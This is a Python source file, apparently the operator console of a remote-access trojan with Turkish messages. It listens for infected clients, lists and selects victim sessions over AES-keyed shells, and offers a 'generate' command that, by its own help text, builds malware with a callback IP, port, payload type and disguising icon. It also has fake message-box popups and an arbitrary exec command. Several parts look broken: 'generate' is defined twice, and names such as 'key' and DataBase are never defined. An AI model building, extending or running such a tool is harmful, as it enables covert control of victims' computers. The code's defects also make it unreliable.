#!/usr/bin/env python3

# -*- encoding: utf-8
import os
import sys
import ctypes
import random
import subprocess
from core.cmd import Cmd


from core.utils.client import Client


from core.utils.msgbox import dialogs
from core.utils.msgbox import PreDialogs
from core.utils.msgbox import MessageBox

from core.utils.socket_server import *

from core.utils.parser import LineParser,DataStore

from core.utils.commons.crypto import AESCipher,RSACipher

from core.utils.commons.networking import *

from core.utils.commons.exceptions import *

from core.cmds.client_cmd import CliCmd

from core.utils.commons.io_utils import IOUtils

from core.utils.commons.randomize import random_string

from core.utils.printing import *

from core.utils.sys_utils import SYSUtils

from core.utils.commons.commands import Commands
from core.utils.commons.commands import ErrorMessages

class Console(Cmd):
    is_binded = False
    def show_clients(self):
        for num,ip in DataBase.all_client_num_tags.items():
            sock = DataBase.all_client_socks[ip]
            hostname = DataBase.all_client_hostnames[ip]
            port = DataBase.all_client_addrs[ip]
            c = Client(client_sock=sock,client_aes_key=key,client_aes_iv=key)
            if Client.is_online(sock):
                print_pattern(f"{num}. {ip}:{port}({hostname}) Online")
            else:
                print_pattern(f"{num}. {ip}:{port}({hostname}) Offline")
    def show_dialogs(self):
        for p in dialogs:
            print_pattern(p)
    def do_show(self,opt: str) -> str:
        f = list(filter(lambda l:l if l.startswith("show_") else None,dir(self)))
        if not opt:
            print_failure(f"Hatalı kullanım e.g show %s" % (random.choice(f)))
        else:
            if hasattr(self, "show_"+opt):
                try:
                    getattr(self, "show_"+opt)()
                except Exception as show_exec_err:
                    print_failure(f"Hata {opt} çalıştırılırken bir hata oluştu",show_exec_err)
            else:
                print_failure(f"Hatalı opsion {opt} sadece show options veya show clients çalıştırılabilir")
    def do_get_public_ip(self,line) -> str:
        """
        Public ip adresini öğrenmek için
        """
        pub_ip = get_public_ip()
        if pub_ip:
            print_status("Public ip: ",pub_ip)
        else:
            print_failure("Hata internet bağlantısı yok!")
    def do_generate(self,line: str) -> None:
        print("Hello")
    def do_get_local_ip(self,line) -> str:
        local_ip = get_local_ip()
        if local_ip:
            print_status("Local ip: ",local_ip)
        else:
            print_failure("Hata local ip adresi alınamadı")
    def do_cd(self,path: str) -> None:
        if not path == "":
            print_status("Şu klasöre geçiş yapılıyor: ",path)
            try:
                os.chdir(path)
                print_succes("Geçiş yapıldı: ",path)
            except CDError as cd_err:
                print_failure("Hata şu klasöre geçiş yapılamadı: ",cd_err)
        else:
            random_dir = random.choice(list(filter(lambda path: path if os.path.isdir(path) else None,os.listdir())))
            print_status(f"Hatalı kullanım e.g cd {random_dir}")
    def do_ls(self,path: str) -> None:
        if path == "":
            path = os.getcwd()
        if not os.path.exists(path):
            print_failure(f"Hata {path} mevcut değil")
        elif not os.path.isdir(path):
            print_failure(f"Hata {path} bir klasör değil")
        else:
            for files in os.listdir(path):
                full_path = os.path.join(path,files)
                if os.path.isfile(full_path):
                    print_status("Dosya",full_path)
                elif os.path.isdir(full_path):
                    print_status("Klasör",full_path)
                elif os.path.islink(full_path):
                    print_status("Dosya link",full_path)
                else:
                    print_failure("Bilinmeyen dosya biçimi",full_path)
    def do_py_exec(self,data: str) -> None:
        print_status("Komut çalıştırılıyor")
        print_status(data)
        try:
            exec(data)
        except Exception as exec_error:
            print_failure("Komut çalıştırırken bir hata oluştu",exec_error)
    def do_listen(self,line: str):
        parser = LineParser(line=line,funcname="listen")
        parser.new_arguments("-i",name="ip_addr",is_required=True,help_doc="Sunucunun bind edileceği ip adresi")
        parser.new_arguments("-p",name="port",is_required=True,help_doc="Sunucunun bind edileceği port numarası")
        p = parser.parse_args()
        if not p is False:
            if not ip_validator(p.ip_addr):
                print_failure("Hatalı ip adresi: %s ip adresi şunun gibi olmalıdır: %s " % (p.ip_addr,get_random_ip()))
            elif not port_validator(int(p.port)):
                print_failure("Hatalı port numarası: %s " % (p.port))
            else:
                with SocketServer(host=p.ip_addr,port=int(p.port)) as server:
                    server.quick_bind()
    def do_select(self,line: str):
        if len(DataBase.all_client_addrs) > 0:
            l = LineParser(line=line)
            l.new_arguments("-s",name="session",is_required=True,typing="int",help_doc="Seçilecek olan client")
            p = l.parse_args()
            if not p is False:
                session = int(p.session)
                try:
                    ip = DataBase.all_client_num_tags[session]
                    if ip:
                        sock = DataBase.all_client_socks[ip]
                        port = DataBase.all_client_addrs[ip]
                        hostname = DataBase.all_client_hostnames[ip]
                        c = CliCmd(
                            sock=sock,
                            host=ip,
                            port=port,
                            aes_key=key,
                            aes_iv=key
                        )
                        c.cmdloop()
                except KeyError:
                    print_failure("Hatalı client index'i")
    def do_generate(self,line: str) -> None:
        line_parser = LineParser(line=line,funcname=self.do_generate)
        line_parser.new_argument("-i",name="ip_addr",is_required=True,help="Bağlanılacak olan ip adresi")
        line_parser.new_argument("-p",name="port",is_required=True,typing="int",help="Bağlananılacak olan port numarası max 65535")
        line_parser.new_argument("-t",name="payload_type",is_required=True,choices=["mail","socket"],help="Çıkacak olan zararlı yazılımın tipi")
        line_parser.new_argument("-c",name="icon",is_required=True,help="Çıkacak olan zararlı yazılımın ikonu")
        line_parser.new_argument("-n",name="name",is_required=False,help="Çıkacak olan zararlı yazılımın çıktı ismi")
        res = line_parser.parse_args()
        
    def do_msgbox(self,line: str):
        l = LineParser(line=line,funcname="msgbox")
        l.new_arguments("--title",name="title",is_required=True)
        l.new_arguments("--data",name="data",is_required=True)
        l.new_arguments("--dialog",name="dialog",is_required=True,choices=dialogs)
        p = l.parse_args()
        if not p is False:
            MessageBox(
                box = getattr(PreDialogs,p.dialog),
                title=p.title,
                text=p.data
            )
    def do_pwd(self,line):
        print_status("Şuan ki konumuz: ",os.getcwd())
    def do_EOF(self,line):
        print_warning("exit yazarak çıkış yapabilirsin")
    def do_exit(self,line):
        print_warning("Çıkış yapılıyor....")
        os._exit(0)
    def do_connect(self,line: str):
        start()
def ConsoleStart(*args):
    try:
        prompt = Console()
        prompt.prompt = SYSUtils.get_sys_ps2()
        prompt.cmdloop()
    except KeyboardInterrupt:
        print_status("CTRL-C Algılandı")
        os._exit(0)
if __name__ == "__main__":
    pass